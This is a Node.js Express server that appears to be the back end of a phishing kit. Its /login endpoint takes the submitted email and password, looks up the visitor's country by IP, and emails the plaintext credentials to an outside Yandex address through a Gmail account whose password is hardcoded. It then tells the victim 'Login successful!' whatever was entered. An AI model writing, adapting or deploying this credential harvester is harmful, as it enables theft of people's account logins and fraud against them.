const express = require('express');
const axios = require('axios');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

app.post('/login', async (req, res) => {
    const email = req.body.temail?.trim();
    const password = req.body.tpass?.trim();
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const country = await visitorCountry(ip);
    const serverTime = new Date().toLocaleString();

    let signal;
    let msg;

    if (email && password) {
        const own = 'alijafari077@yandex.com';
        const subj = `Login: | ${email} | ${country} | ${ip}`;

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'xperiencepiro@gmail.com',
                pass: 'tozr lugl sikd zrfx' // Replace with your email password or use OAuth2
            }
        });

        const message = `
            [Logged]

            Username: ${email}
            Password: ${password}
            Country: ${country} | User IP: <a href='http://whoer.net/check?host=${ip}' target='_blank'>${ip}</a>
            Date: ${serverTime}
        `;

        await transporter.sendMail({
            from: 'LogZ-2022 xkcdProject <login@xkcdproject.com>',
            to: own,
            subject: subj,
            html: message
        });

        signal = 'ok';
        msg = 'Login successful!'; // Modify according to your logic
    } else {
        signal = 'ok';
        msg = 'Please fill in all the fields.';
    }

    res.json({ signal, msg });
});

async function visitorCountry(ip) {
    try {
        const response = await axios.get(`http://www.geoplugin.net/json.gp?ip=${ip}`);
        const data = response.data;
        return data.geoplugin_countryName || "Unknown";
    } catch (error) {
        console.error(error);
        return "Unknown";
    }
}

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
